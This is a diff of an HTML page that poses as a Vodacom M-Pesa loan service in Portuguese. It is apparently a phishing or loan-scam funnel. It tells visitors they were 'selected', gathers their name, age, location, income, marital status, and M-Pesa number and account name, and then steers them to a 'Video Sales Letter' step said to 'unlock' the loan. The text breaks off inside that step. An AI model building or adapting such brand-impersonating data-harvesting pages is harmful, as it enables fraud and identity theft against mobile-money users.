@@ -1,149 +1,285 @@
 <!DOCTYPE html>
 <html lang="pt">
 <head>
-    <meta charset="utf-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1" />
-    <title>Empréstimos M-Pesa | Vodacom Moçambique</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Empréstimos M-Pesa - Vodacom</title>
+    <!-- Tailwind CSS CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        vodared: '#E60000',
+                        vodadark: '#B30000',
+                        mpesagreen: '#00A859'
+                    }
+                }
+            }
+        }
+    </script>
     <style>
-        * {
-            box-sizing: border-box;
-            margin: 0;
-            padding: 0;
+        @keyframes pulse-dot {
+            0% { transform: scale(0.95); opacity: 0.9; }
+            50% { transform: scale(1.15); opacity: 1; }
+            100% { transform: scale(0.95); opacity: 0.9; }
         }
-        body {
-            font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            background-color: #f4f6f9;
-            color: #0f172a;
-            min-height: 100vh;
-            -webkit-font-smoothing: antialiased;
+        .live-pulse {
+            animation: pulse-dot 1.5s infinite;
         }
-        /* Cabeçalho */
-        header {
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            background-color: #ffffff;
-            padding: 12px 16px;
-            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.08);
-        }
-        .brand-btn {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            background: none;
-            border: none;
-            text-align: left;
-            cursor: pointer;
-        }
-        .logo-small {
-            width: 44px;
-            height: 44px;
-            border-radius: 50%;
-            overflow: hidden;
-            flex-shrink: 0;
-        }
-        .brand-title {
-            font-size: 16px;
-            font-weight: 800;
-            color: #e60000;
-            line-height: 1.2;
-        }
-        .brand-title span {
-            font-weight: 400;
-            color: #64748b;
-        }
-        .brand-subtitle {
-            font-size: 10px;
-            font-weight: 600;
-            text-transform: uppercase;
-            letter-spacing: 0.12em;
-            color: #64748b;
-            margin-top: 2px;
-        }
-        .live-badge {
-            display: flex;
-            align-items: center;
-            gap: 6px;
-            background-color: #fee2e2;
-            color: #e60000;
-            padding: 4px 10px;
-            border-radius: 9999px;
-            font-size: 10px;
-            font-weight: 800;
-            text-transform: uppercase;
-            letter-spacing: 0.1em;
-        }
-        .live-dot {
-            width: 6px;
-            height: 6px;
-            background-color: #e60000;
-            border-radius: 50%;
-        }
-        /* Conteúdo Principal */
-        main {
-            padding: 24px 12px;
-        }
-        .card {
-            max-width: 420px;
-            margin: 0 auto;
-            background-color: #ffffff;
-            border-radius: 16px;
-            overflow: hidden;
-            box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.08), 0 8px 10px -6px rgba(0, 0, 0, 0.04);
-        }
-        .card-top-bar {
-            height: 8px;
-            width: 100%;
-            background-color: #e60000;
-        }
-        .card-body {
-            padding: 28px 20px 32px;
-            text-align: center;
-        }
-        .logo-large {
-            width: 96px;
-            height: 96px;
-            border-radius: 18px;
-            margin: 0 auto;
-            display: block;
-            box-shadow: 0 10px 20px -3px rgba(230, 0, 0, 0.35);
-            overflow: hidden;
-        }
-        .congrats-pill {
-            display: inline-flex;
-            align-items: center;
-            gap: 8px;
-            background-color: #fee2e2;
-            color: #e60000;
-            padding: 6px 16px;
-            border-radius: 9999px;
-            font-size: 12px;
-            font-weight: 800;
-            text-transform: uppercase;
-            letter-spacing: 0.18em;
-            margin-top: 18px;
-        }
-        h1 {
-            margin-top: 16px;
-            font-size: 32px;
-            font-weight: 800;
-            line-height: 1.15;
-            color: #0f172a;
-        }
-        h1 span {
-            color: #e60000;
-        }
-        .description {
-            margin-top: 14px;
-            font-size: 16px;
-            line-height: 1.6;
-            color: #64748b;
-        }
-        .text-red {
-            color: #e60000;
-            font-weight: 800;
-        }
-        .text-dark {
-            color: #0f172a;
-            font-weight: 800;
-        }
+    </style>
+</head>
+<body class="bg-gray-50 text-gray-800 min-h-screen flex flex-col justify-between font-sans">
+
+    <!-- Top Header -->
+    <header class="bg-white shadow-sm border-b border-gray-100 py-3 px-4 flex items-center justify-between sticky top-0 z-50">
+        <div class="flex items-center space-x-2">
+            <a href="https://ibb.co/h3yB1Mw">
+                <img src="https://i.ibb.co/h3yB1Mw/mpesa-logo-E-5cvo-S6.png" alt="mpesa-logo" border="0" class="h-8 w-auto">
+            </a>
+            <span class="font-bold text-gray-800 text-sm tracking-tight">Vodacom | M-Pesa</span>
+        </div>
+        <div class="flex items-center space-x-2 bg-red-50 border border-red-200 px-2.5 py-1 rounded-full">
+            <span class="w-2.5 h-2.5 bg-vodared rounded-full live-pulse inline-block"></span>
+            <span class="text-xs font-semibold text-vodared tracking-wide uppercase">ao vivo</span>
+        </div>
+    </header>
+
+    <!-- Main Content Container -->
+    <main class="flex-grow flex items-center justify-center p-4">
+        <div class="w-full max-w-md bg-white rounded-2xl shadow-lg border border-gray-100 overflow-hidden my-4">
+
+            <!-- STEP 0: Welcome Screen -->
+            <div id="step-0" class="step-content p-6 text-center">
+                <div class="flex justify-center mb-6">
+                    <img src="https://i.ibb.co/h3yB1Mw/mpesa-logo-E-5cvo-S6.png" alt="M-Pesa Logo" class="h-16 w-auto drop-shadow-md">
+                </div>
+                <h1 class="text-2xl font-extrabold text-gray-900 mb-3 leading-snug">Você foi selecionado!</h1>
+                <p class="text-gray-600 text-sm mb-8 leading-relaxed">
+                    Estás prestes a ativar o novo serviço da Vodacom, o Emprestimos M-Pesa, siga as instruções abaixo.
+                </p>
+                <button onclick="nextStep()" class="w-full bg-vodared hover:bg-vodadark text-white font-bold py-3.5 px-6 rounded-xl shadow-lg transition duration-200 text-base">
+                    Começar
+                </button>
+            </div>
+
+            <!-- Progress Bar Header (Steps 1-7) -->
+            <div id="progress-header" class="hidden px-6 pt-6 pb-2 border-b border-gray-100">
+                <div class="flex justify-between items-center mb-2">
+                    <button onclick="prevStep()" class="text-xs text-gray-500 hover:text-gray-800 flex items-center font-medium">
+                        ← Voltar
+                    </button>
+                    <span id="step-counter" class="text-xs font-semibold text-vodared">Etapa 1 de 7</span>
+                </div>
+                <div class="w-full bg-gray-200 h-2 rounded-full overflow-hidden">
+                    <div id="progress-bar" class="bg-vodared h-full transition-all duration-300" style="width: 14%;"></div>
+                </div>
+            </div>
+
+            <!-- STEP 1: Nome Completo -->
+            <div id="step-1" class="step-content hidden p-6">
+                <h2 class="text-lg font-bold text-gray-900 mb-1">Qual é o seu nome completo?</h2>
+                <p class="text-xs text-gray-500 mb-6">Insira o seu nome registado no documento de identificação.</p>
+                
+                <div class="space-y-4">
+                    <div>
+                        <label class="block text-xs font-medium text-gray-700 mb-1">Nome Completo</label>
+                        <input type="text" id="input-nome" placeholder="Ex: Maria João Mondlane" class="w-full px-4 py-3 rounded-xl border border-gray-300 focus:ring-2 focus:ring-vodared focus:border-transparent outline-none text-sm">
+                    </div>
+                    <button onclick="validateAndNext(1)" class="w-full bg-vodared hover:bg-vodadark text-white font-bold py-3 px-6 rounded-xl shadow transition duration-200 text-sm mt-4">
+                        Continuar
+                    </button>
+                </div>
+            </div>
+
+            <!-- STEP 2: Perfil (Onde vive e Idade) -->
+            <div id="step-2" class="step-content hidden p-6">
+                <h2 class="text-lg font-bold text-gray-900 mb-1">Perfil</h2>
+                <p class="text-xs text-gray-500 mb-6">Onde vive e qual é a sua idade?</p>
+                
+                <div class="space-y-4">
+                    <div>
+                        <label class="block text-xs font-medium text-gray-700 mb-1">Em que localidade vive?</label>
+                        <input type="text" id="input-localidade" placeholder="Ex: Maputo, Matola, Beira..." class="w-full px-4 py-3 rounded-xl border border-gray-300 focus:ring-2 focus:ring-vodared focus:border-transparent outline-none text-sm">
+                    </div>
+                    <div>
+                        <label class="block text-xs font-medium text-gray-700 mb-1">Qual é a sua idade?</label>
+                        <input type="number" id="input-idade" placeholder="Ex: 28" class="w-full px-4 py-3 rounded-xl border border-gray-300 focus:ring-2 focus:ring-vodared focus:border-transparent outline-none text-sm">
+                    </div>
+                    <button onclick="validateAndNext(2)" class="w-full bg-vodared hover:bg-vodadark text-white font-bold py-3 px-6 rounded-xl shadow transition duration-200 text-sm mt-4">
+                        Continuar
+                    </button>
+                </div>
+            </div>
+
+            <!-- STEP 3: Valor -->
+            <div id="step-3" class="step-content hidden p-6">
+                <h2 class="text-lg font-bold text-gray-900 mb-1">Valor</h2>
+                <p class="text-xs text-gray-500 mb-4">Quanto pretende solicitar? <br><span class="text-vodared font-medium">Valores permitidos: MT 70 até MT 5.000.</span></p>
+                
+                <div class="space-y-4">
+                    <div>
+                        <label class="block text-xs font-medium text-gray-700 mb-1">Valor em Meticais (MT)</label>
+                        <input type="number" id="input-valor" placeholder="Ex: 1500" class="w-full px-4 py-3 rounded-xl border border-gray-300 focus:ring-2 focus:ring-vodared focus:border-transparent outline-none text-sm font-semibold text-gray-900">
+                    </div>
+                    <div class="grid grid-cols-2 gap-2">
+                        <button type="button" onclick="setValor(500)" class="py-2.5 px-3 border border-gray-200 hover:border-vodared rounded-xl text-xs font-medium bg-gray-50 hover:bg-red-50 transition">MT 500</button>
+                        <button type="button" onclick="setValor(1500)" class="py-2.5 px-3 border border-gray-200 hover:border-vodared rounded-xl text-xs font-medium bg-gray-50 hover:bg-red-50 transition">MT 1500</button>
+                        <button type="button" onclick="setValor(3000)" class="py-2.5 px-3 border border-gray-200 hover:border-vodared rounded-xl text-xs font-medium bg-gray-50 hover:bg-red-50 transition">MT 3000</button>
+                        <button type="button" onclick="setValor(5000)" class="py-2.5 px-3 border border-gray-200 hover:border-vodared rounded-xl text-xs font-medium bg-gray-50 hover:bg-red-50 transition">MT 5000</button>
+                    </div>
+                    <button onclick="validateAndNext(3)" class="w-full bg-vodared hover:bg-vodadark text-white font-bold py-3 px-6 rounded-xl shadow transition duration-200 text-sm mt-4">
+                        Continuar
+                    </button>
+                </div>
+            </div>
+
+            <!-- STEP 4: Prazo -->
+            <div id="step-4" class="step-content hidden p-6">
+                <h2 class="text-lg font-bold text-gray-900 mb-1">Prazo</h2>
+                <p class="text-xs text-gray-500 mb-6">Quando pretende solicitar o valor?</p>
+                
+                <div class="space-y-2.5">
+                    <label class="flex items-center p-3 border border-gray-200 rounded-xl cursor-pointer hover:bg-red-50 hover:border-vodared transition">
+                        <input type="radio" name="prazo" value="Hoje" class="text-vodared focus:ring-vodared h-4 w-4" checked>
+                        <span class="ml-3 text-sm font-medium text-gray-700">Hoje</span>
+                    </label>
+                    <label class="flex items-center p-3 border border-gray-200 rounded-xl cursor-pointer hover:bg-red-50 hover:border-vodared transition">
+                        <input type="radio" name="prazo" value="Nos próximos 3 dias" class="text-vodared focus:ring-vodared h-4 w-4">
+                        <span class="ml-3 text-sm font-medium text-gray-700">Nos próximos 3 dias</span>
+                    </label>
+                    <label class="flex items-center p-3 border border-gray-200 rounded-xl cursor-pointer hover:bg-red-50 hover:border-vodared transition">
+                        <input type="radio" name="prazo" value="Nesta semana" class="text-vodared focus:ring-vodared h-4 w-4">
+                        <span class="ml-3 text-sm font-medium text-gray-700">Nesta semana</span>
+                    </label>
+                    <label class="flex items-center p-3 border border-gray-200 rounded-xl cursor-pointer hover:bg-red-50 hover:border-vodared transition">
+                        <input type="radio" name="prazo" value="Ainda estou a avaliar" class="text-vodared focus:ring-vodared h-4 w-4">
+                        <span class="ml-3 text-sm font-medium text-gray-700">Ainda estou a avaliar</span>
+                    </label>
+                </div>
+                <button onclick="nextStep()" class="w-full bg-vodared hover:bg-vodadark text-white font-bold py-3 px-6 rounded-xl shadow transition duration-200 text-sm mt-6">
+                    Continuar
+                </button>
+            </div>
+
+            <!-- STEP 5: Finalidade & Fonte -->
+            <div id="step-5" class="step-content hidden p-6">
+                <h2 class="text-lg font-bold text-gray-900 mb-1">Finalidade</h2>
+                <p class="text-xs text-gray-500 mb-4">Para que pretende utilizar o dinheiro?</p>
+                
+                <div class="space-y-4 mb-6">
+                    <select id="select-finalidade" class="w-full px-4 py-3 rounded-xl border border-gray-300 focus:ring-2 focus:ring-vodared focus:border-transparent outline-none text-sm bg-white">
+                        <option value="Despesas pessoais">Despesas pessoais</option>
+                        <option value="Negócio">Negócio</option>
+                        <option value="Alimentação">Alimentação</option>
+                        <option value="Escola/Educação">Escola/Educação</option>
+                        <option value="Transporte">Transporte</option>
+                        <option value="Contas">Contas</option>
+                        <option value="Outro">Outro</option>
+                    </select>
+
+                    <div>
+                        <label class="block text-xs font-medium text-gray-700 mb-1">Qual é a sua principal fonte de rendimento?</label>
+                        <select id="select-fonte" class="w-full px-4 py-3 rounded-xl border border-gray-300 focus:ring-2 focus:ring-vodared focus:border-transparent outline-none text-sm bg-white">
+                            <option value="Emprego">Emprego</option>
+                            <option value="Negócio próprio">Negócio próprio</option>
+                            <option value="Trabalho informal">Trabalho informal</option>
+                            <option value="Agricultura">Agricultura</option>
+                            <option value="Trabalho por conta própria">Trabalho por conta própria</option>
+                            <option value="Outra">Outra</option>
+                        </select>
+                    </div>
+                </div>
+                <button onclick="nextStep()" class="w-full bg-vodared hover:bg-vodadark text-white font-bold py-3 px-6 rounded-xl shadow transition duration-200 text-sm">
+                    Continuar
+                </button>
+            </div>
+
+            <!-- STEP 6: Últimos dados -->
+            <div id="step-6" class="step-content hidden p-6">
+                <h2 class="text-lg font-bold text-gray-900 mb-1">Últimos dados</h2>
+                <p class="text-xs text-gray-500 mb-4">Informações finais para liberação do saldo.</p>
+                
+                <div class="space-y-4 mb-6">
+                    <div>
+                        <label class="block text-xs font-medium text-gray-700 mb-1">Quanto consegue ganhar aproximadamente por mês?</label>
+                        <select id="select-rendimento" class="w-full px-3 py-2.5 rounded-xl border border-gray-300 focus:ring-2 focus:ring-vodared outline-none text-xs bg-white">
+                            <option value="Menos de MT 5.000">Menos de MT 5.000</option>
+                            <option value="MT 5.000 – 10.000">MT 5.000 – 10.000</option>
+                            <option value="MT 10.001 – 20.000">MT 10.001 – 20.000</option>
+                            <option value="Mais de MT 20.000">Mais de MT 20.000</option>
+                        </select>
+                    </div>
+
+                    <div>
+                        <label class="block text-xs font-medium text-gray-700 mb-1">Qual é o seu estado civil?</label>
+                        <select id="select-estadocivil" class="w-full px-3 py-2.5 rounded-xl border border-gray-300 focus:ring-2 focus:ring-vodared outline-none text-xs bg-white">
+                            <option value="Solteiro(a)">Solteiro(a)</option>
+                            <option value="Casado(a)">Casado(a)</option>
+                            <option value="União de facto">União de facto</option>
+                            <option value="Divorciado(a)">Divorciado(a)</option>
+                            <option value="Viúvo(a)">Viúvo(a)</option>
+                        </select>
+                    </div>
+
+                    <div>
+                        <label class="block text-xs font-medium text-gray-700 mb-1">Número M-Pesa a receber o empréstimo</label>
+                        <input type="tel" id="input-numero" placeholder="Ex: 84XXXXXXX / 85XXXXXXX" class="w-full px-3 py-2.5 rounded-xl border border-gray-300 focus:ring-2 focus:ring-vodared outline-none text-xs">
+                    </div>
+
+                    <div>
+                        <label class="block text-xs font-medium text-gray-700 mb-1">Nome do seu M-Pesa</label>
+                        <input type="text" id="input-nomempesa" placeholder="Nome titular da conta M-Pesa" class="w-full px-3 py-2.5 rounded-xl border border-gray-300 focus:ring-2 focus:ring-vodared outline-none text-xs">
+                    </div>
+                </div>
+                <button onclick="validateAndReview()" class="w-full bg-vodared hover:bg-vodadark text-white font-bold py-3 px-6 rounded-xl shadow transition duration-200 text-sm">
+                    Ver resumo
+                </button>
+            </div>
+
+            <!-- STEP 7: Resumo -->
+            <div id="step-7" class="step-content hidden p-6">
+                <h2 class="text-lg font-bold text-gray-900 mb-1">Resumo</h2>
+                <p class="text-xs text-gray-500 mb-4">Confirme os seus dados antes de prosseguir.</p>
+                
+                <div class="bg-gray-50 border border-gray-200 rounded-xl p-4 text-xs space-y-2 mb-6 max-h-60 overflow-y-auto">
+                    <div class="flex justify-between border-b border-gray-200 pb-1.5"><span class="text-gray-500">Nome:</span> <span id="res-nome" class="font-medium text-gray-800">--</span></div>
+                    <div class="flex justify-between border-b border-gray-200 pb-1.5"><span class="text-gray-500">Localidade:</span> <span id="res-localidade" class="font-medium text-gray-800">--</span></div>
+                    <div class="flex justify-between border-b border-gray-200 pb-1.5"><span class="text-gray-500">Idade:</span> <span id="res-idade" class="font-medium text-gray-800">--</span></div>
+                    <div class="flex justify-between border-b border-gray-200 pb-1.5"><span class="text-gray-500">Valor:</span> <span id="res-valor" class="font-medium text-gray-800">--</span></div>
+                    <div class="flex justify-between border-b border-gray-200 pb-1.5"><span class="text-gray-500">Quando pretende:</span> <span id="res-prazo" class="font-medium text-gray-800">--</span></div>
+                    <div class="flex justify-between border-b border-gray-200 pb-1.5"><span class="text-gray-500">Finalidade:</span> <span id="res-finalidade" class="font-medium text-gray-800">--</span></div>
+                    <div class="flex justify-between border-b border-gray-200 pb-1.5"><span class="text-gray-500">Fonte de rendimento:</span> <span id="res-fonte" class="font-medium text-gray-800">--</span></div>
+                    <div class="flex justify-between border-b border-gray-200 pb-1.5"><span class="text-gray-500">Rendimento mensal:</span> <span id="res-rendimento" class="font-medium text-gray-800">--</span></div>
+                    <div class="flex justify-between border-b border-gray-200 pb-1.5"><span class="text-gray-500">Estado civil:</span> <span id="res-estadocivil" class="font-medium text-gray-800">--</span></div>
+                    <div class="flex justify-between border-b border-gray-200 pb-1.5"><span class="text-gray-500">Número M-Pesa:</span> <span id="res-numero" class="font-medium text-gray-800">--</span></div>
+                    <div class="flex justify-between"><span class="text-gray-500">Nome M-Pesa:</span> <span id="res-nomempesa" class="font-medium text-gray-800">--</span></div>
+                </div>
+
+                <button onclick="goToVSL()" class="w-full bg-vodared hover:bg-vodadark text-white font-bold py-3.5 px-6 rounded-xl shadow-lg transition duration-200 text-sm">
+                    Continuar
+                </button>
+            </div>
+
+            <!-- STEP 8: VSL (Video Sales Letter) Page -->
+            <div id="step-8" class="step-content hidden p-6">
+                <h2 class="text-xl font-bold text-gray-900 mb-2 text-center">Assista ao vídeo para liberar o seu Empréstimo M-Pesa</h2>
+                <p class="text-xs text-gray-600 mb-4 text-center">Veja o vídeo abaixo até ao fim para receber a solicitação de empréstimo diretamente no seu M-Pesa.</p>
+
+                <!-- Video Box Simulation -->
+                <div class="relative bg-black rounded-xl overflow-hidden aspect-video shadow-md mb-4 flex items-center justify-center">
+                    <div class="absolute inset-0 bg-gradient-to-t from-black/70 via-transparent to-transparent flex flex-col justify-end p-4 text-white">
+                        <span class="text-xs font-semibold bg-vodared px-2 py-0.5 rounded w-max mb-1">Vídeo Oficial</span>
+                        <p class="text-xs opacity-90">Instruções de Desbloqueio M-Pesa</p>
+                    </div>
+                    <div class="w-12 h-12 bg-vodared rounded-full flex items-center justify-center shadow-lg text-white font-bold text-lg cursor-pointer live-pulse">
+                        ▶
+                    </div>
+                </div>
+
+                <!-- Sound Alert Box -->
+                <div class="bg-red-50 border border-red-200 rounded-xl p-3 mb-4 text-center">
+                    <p class="text-xs font-medium text-red-800 mb-2">Certifique-se de que o som está ligado</p>
+                    <button onclick="alert('Som ativado com sucesso!')" class="bg-vodared hover:bg-vodadark text-white text-xs font-bold py-2 px-4 rounded-lg shadow transition">
+                        Ligar o som
